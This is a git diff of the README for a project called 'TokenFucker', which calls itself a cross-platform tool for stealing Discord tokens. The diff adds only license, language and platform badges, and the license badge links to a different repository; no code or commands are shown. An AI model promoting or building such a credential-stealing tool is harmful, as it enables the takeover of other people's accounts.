@@ -2,6 +2,17 @@
 ![TokenFucker](https://media.discordapp.net/attachments/843628315146321940/1049398161254391808/TokenFucker5.png?width=960&height=346)
 <p align="center">
     <em>Cross plataform tool for Discord Token Stealing</em></p>
+    <p align="center">
+    <a href="https://github.com/ZaikoARG/PyDump/blob/main/LICENSE">
+      <img src="https://img.shields.io/badge/license-Apache%202-blue.svg" />
+    </a>
+    <a href="https://www.python.org/">
+    	<img src="https://img.shields.io/badge/built%20with-Python%203.10-red.svg" />
+    </a>
+    <a href="">
+    	<img src="https://img.shields.io/badge/platform-Win%2064%20%7C%20Linux%2032%20%7C%20Linux%2064-blue.svg" />
+    </a>
+  </p>
 
 
 
